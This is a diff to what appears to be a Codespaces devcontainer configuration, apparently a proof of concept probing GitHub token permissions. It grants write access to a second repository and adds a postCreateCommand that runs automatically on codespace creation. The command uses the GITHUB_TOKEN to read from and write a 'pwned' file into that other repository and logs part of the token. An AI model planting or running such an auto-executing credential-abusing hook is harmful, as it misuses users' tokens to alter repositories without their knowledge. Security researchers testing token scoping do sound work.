@@ -6,6 +6,17 @@
       "version": "latest"
     }
   },
+  "customizations": {
+    "codespaces": {
+      "repositories": {
+        "marouanedahmani27-coder/dependabot-proxy-poc-1784930324": {
+          "permissions": {
+            "contents": "write"
+          }
+        }
+      }
+    }
+  },
   "postCreateCommand": "bash -c 'OWN=$(curl -s -o /dev/null -w \"%{http_code}\" -H \"Authorization: token $GITHUB_TOKEN\" https://api.github.com/repos/marouanedahmani27-coder/codespaces-poc-1784939365); OTHER_READ=$(curl -s -o /dev/null -w \"%{http_code}\" -H \"Authorization: token $GITHUB_TOKEN\" https://api.github.com/repos/marouanedahmani27-coder/dependabot-proxy-poc-1784930324); OTHER_WRITE=$(curl -s -o /tmp/write_resp.json -w \"%{http_code}\" -X PUT -H \"Authorization: token $GITHUB_TOKEN\" -H \"Content-Type: application/json\" https://api.github.com/repos/marouanedahmani27-coder/dependabot-proxy-poc-1784930324/contents/codespaces-token-test.txt -d \"{\\\"message\\\":\\\"codespaces token perms test\\\",\\\"content\\\":\\\"$(echo pwned | base64)\\\"}\"); echo \"TS=$(date +%s) OWN_READ=$OWN OTHER_READ=$OTHER_READ OTHER_WRITE=$OTHER_WRITE\" > /tmp/perm_test.txt; echo \"TOKEN_PREFIX=${GITHUB_TOKEN:0:6}\" >> /tmp/perm_test.txt'",
   "onCreateCommand": "echo ONC_MARKER=$(date +%s) > /tmp/oncreate_marker.txt"
 }
